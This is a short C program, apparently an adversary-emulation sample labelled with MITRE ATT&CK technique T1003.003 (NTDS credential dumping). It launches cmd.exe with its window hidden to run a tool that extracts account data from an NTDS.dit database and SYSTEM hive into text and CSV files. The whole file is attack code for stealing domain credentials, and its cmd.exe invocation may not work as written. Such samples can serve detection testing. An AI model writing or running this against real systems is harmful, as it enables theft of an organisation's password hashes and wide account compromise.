// Link      = https://attack.mitre.org/techniques/T1003/003/
// Technique = OS Credential Dumping: NTDS
// ID        = T1003.003
// Tactics   = Credential Access

#include <windows.h>

int main() {
    ShellExecuteA(
        NULL,
        "open",
        "cmd.exe",
        "msadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p a.txt --users-csv a.csv",
        NULL,
        SW_HIDE
    );


    return 0;
}


